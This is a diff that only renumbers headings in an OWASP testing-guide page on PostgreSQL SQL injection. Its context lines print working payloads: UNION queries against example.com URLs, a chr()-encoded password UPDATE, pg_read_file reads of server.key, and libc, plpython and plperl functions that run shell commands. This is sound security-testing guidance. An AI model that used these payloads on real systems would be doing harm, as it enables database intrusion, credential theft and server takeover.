@@ -1,6 +1,6 @@
 # Testing PostgreSQL (from OWASP BSP)
 
-## Summary
+### Summary
 
 In this section, some SQL Injection techniques for PostgreSQL will be discussed. These techniques have the following characteristics:
 
@@ -10,9 +10,9 @@ In this section, some SQL Injection techniques for PostgreSQL will be discussed.
 
 From now on it is assumed that *http://www.example.com/news.php?id=1* is vulnerable to SQL Injection attacks.
 
-## How to Test
+### How to Test
 
-### Identifying PostgreSQL
+#### Identifying PostgreSQL
 
 When a SQL Injection has been found, you need to carefully
 fingerprint the backend database engine. You can determine that the backend database engine
@@ -37,7 +37,7 @@ An example of a banner string that could be returned is:
   PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
 ```
 
-### Blind Injection
+#### Blind Injection
 
 
 For blind SQL injection attacks, you should take into consideration the following built-in functions:
@@ -58,7 +58,7 @@ In addition, you can easily create a custom *pg_sleep(n)* in previous versions b
 * `CREATE function pg_sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' LANGUAGE 'C' STRICT`
 
 
-### Single Quote unescape
+#### Single Quote unescape
 
 Strings can be encoded, to prevent single quotes escaping, by using chr() function.
 
@@ -86,9 +86,9 @@ We can encode 'root' as:
    http://www.example.com/store.php?id=1; UPDATE users SET PASSWORD=chr(114)||chr(111)||chr(111)||chr(116)--
 ```
 
-### Attack Vectors
+#### Attack Vectors
 
-#### Current User
+##### Current User
 
 The identity of the current user can be retrieved with the following SQL SELECT statements:
 ```
@@ -105,7 +105,7 @@ The identity of the current user can be retrieved with the following SQL SELECT 
   http://www.example.com/store.php?id=1 UNION ALL SELECT current_user, NULL, NULL--
 ```
 
-#### Current Database
+##### Current Database
 
 The built-in function `current_database()` returns the current database name.
 
@@ -115,7 +115,7 @@ The built-in function `current_database()` returns the current database name.
   http://www.example.com/store.php?id=1 UNION ALL SELECT current_database(),NULL,NULL--
 ```
 
-#### Reading from a file
+##### Reading from a file
 
 PostgreSQL provides two ways to access a local file:
 * COPY statement
@@ -162,7 +162,7 @@ DBMS data directory.
 * `SELECT pg_read_file('server.key',0,1000); `
 
 
-#### Writing to a file
+##### Writing to a file
 
 By reverting the COPY statement, we can write to the local file system with the *postgres* user rights
 
@@ -171,12 +171,12 @@ By reverting the COPY statement, we can write to the local file system with the 
 ```
 
 
-#### Shell Injection
+##### Shell Injection
 
 PostgreSQL provides a mechanism to add custom functions by using both Dynamic Library and scripting languages such as python, perl, and tcl.
 
 
-##### Dynamic Library
+###### Dynamic Library
 
 Until PostgreSQL 8.1, it was possible to add a custom function linked with *libc*:
 * `CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT`
@@ -214,7 +214,7 @@ STRICT --
 
 
 
-##### plpython
+###### plpython
 
 PL/Python allows users to code PostgreSQL functions in python. It's untrusted so there is no way to restrict
 what user can do. It's not installed by default and can be enabled on a given database by *CREATELANG*
@@ -243,7 +243,7 @@ return os.popen(args[0]).read()’ LANGUAGE plpythonu;--
 ```
 
 
-##### plperl
+###### plperl
 
 Plperl allows us to code PostgreSQL functions in perl. Normally, it is installed as a trusted language in order to disable runtime execution of operations that interact with the underlying operating system, such as *open*. By doing so, it's impossible to gain OS-level access. To successfully inject a proxyshell like function, we need to install the untrusted version from the *postgres* user, to avoid the so-called application mask filtering of trusted/untrusted operations.
 
@@ -267,7 +267,7 @@ Plperl allows us to code PostgreSQL functions in perl. Normally, it is installed
     - `/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`
 
 
-## References
+### References
 
 * OWASP : "[Testing for SQL Injection](https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OWASP-DV-005))"
 
